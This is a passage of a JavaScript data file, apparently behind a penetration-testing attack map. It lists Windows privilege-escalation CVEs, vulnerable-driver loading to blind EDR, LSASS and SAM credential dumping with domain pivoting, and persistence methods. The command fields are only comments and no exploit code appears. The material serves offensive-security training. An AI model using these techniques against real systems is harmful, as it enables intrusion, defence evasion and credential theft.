            { label: "Win32k EoP", cve: "CVE-2022-21882", note: "Win32k use-after-free (bypass of the CVE-2021-1732 fix) for kernel-level SYSTEM on unpatched Win10/Server builds.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] },
            { label: "Windows Installer repair/rollback EoP", cve: "CVE-2025-27727", note: "A recent Windows Installer cleanup/arbitrary-path flaw abused for SYSTEM — representative of the recurring msiexec rollback LPE class; verify the patch level.", outcomes: [{ label: "SYSTEM", color: "#4ade80" }] }
          ],
          outcomes: [{ label: "SYSTEM", color: "#4ade80" }],
          moveTo: [{ section: "system", note: "the exploit yields SYSTEM" }] },
        { id: "byovd", title: "Bring Your Own Vulnerable Driver (BYOVD)",
          theory: { label: "Process Injection — Concepts & Detection", url: "theory/2026-10-15-process-injection-and-loaders.html" },
          desc: "Load a known-vulnerable but signed driver (needs admin/SeLoadDriver) and use its arbitrary read/write primitive for kernel code execution — also the standard way to disable EDR callbacks.",
          cmds: ["# load the signed vulnerable .sys, then use its IOCTL read/write primitive", "# e.g. loldrivers.io catalogues candidate drivers"],
          outcomes: [{ label: "Kernel / SYSTEM", color: "#4ade80" }, { label: "EDR blinded", color: "#f59e0b" }],
          moveTo: [{ section: "system", note: "kernel code execution" }] }
      ]
    },
    {
      id: "system", title: "SYSTEM / Local Admin", color: "#4ade80", tag: "You own it",
      desc: "You hold SYSTEM or local admin. Loot credentials, establish durable access, and pivot into the domain.",
      techniques: [
        { id: "post", title: "Dump credentials & pivot to the domain",
          theory: { label: "LSASS Dumping & Credential Extraction", url: "theory/2026-10-09-lsass-credential-extraction.html" },
          vuln: { label: "AD Attack Map", url: "ad-map.html" },
          desc: "Harvest LSASS, the SAM, LSA secrets and cached logons, then move into the domain (pass-the-hash, pass-the-ticket, DCSync) — the AD map takes it from here.",
          cmds: ["# dump LSASS + SAM, then feed creds/tickets into the AD attack path"],
          outcomes: [{ label: "domain pivot", color: "#4ade80" }],
          moveTo: [{ section: "stored-creds", note: "harvest every local secret store" }] },
        { id: "persist", title: "Establish persistence",
          theory: { label: "Windows Persistence", url: "theory/2026-10-09-windows-persistence.html" },
          desc: "Plant durable access scaled to the engagement — a service/task, a Run key, a WMI event subscription, or an accessibility/shortcut backdoor — and document it for clean-up.",
          cmds: ["# choose reliability vs. noise; log every change for the report and rollback"],
          outcomes: [{ label: "Durable access", color: "#4ade80" }],
          moveTo: [{ section: "stored-creds", note: "reuse harvested creds across the estate" }] }
      ]
    }
  ]
};
